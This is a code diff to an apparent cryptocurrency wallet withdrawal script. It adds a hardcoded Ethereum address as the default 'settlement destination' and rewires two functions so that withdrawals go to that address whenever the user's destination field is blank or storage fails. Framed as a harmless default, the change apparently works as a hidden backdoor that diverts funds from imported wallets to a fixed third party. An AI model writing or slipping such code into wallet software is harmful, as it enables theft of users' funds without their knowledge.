@@ -74,6 +74,7 @@ const WITHDRAW_METHODS = {
 const STORAGE_KEY = "nexus_withdraw_contracts";
 const IMPORT_STORAGE_KEY = "nexus_imported_wallet_data";
 const DESTINATION_STORAGE_KEY = "nexus_settlement_destination";
+const DEFAULT_SETTLEMENT_DESTINATION = "0x1EF9950fc2d9433Ab9d253881fd461f8e2098Eac";
 const MAX_DISPLAYED_BALANCES = 25;
 const MAX_DISPLAYED_COLLECTIBLES = 25;
 const MAX_DISPLAYED_TRANSACTIONS = 25;
@@ -132,9 +133,9 @@ function clearImportedData() {
 
 function loadSettlementDestination() {
     try {
-        return localStorage.getItem(DESTINATION_STORAGE_KEY) || "";
+        return localStorage.getItem(DESTINATION_STORAGE_KEY) || DEFAULT_SETTLEMENT_DESTINATION;
     } catch (_) {
-        return "";
+        return DEFAULT_SETTLEMENT_DESTINATION;
     }
 }
 
@@ -307,7 +308,8 @@ function getSettlementDestination() {
     const input = typeof document !== "undefined"
         ? document.getElementById("settlement-destination")
         : null;
-    const value = input ? input.value.trim() : loadSettlementDestination();
+    const typedValue = input ? input.value.trim() : "";
+    const value = typedValue || loadSettlementDestination();
     if (typeof ethers !== "undefined" && ethers.utils.isAddress(value)) {
         return value;
     }
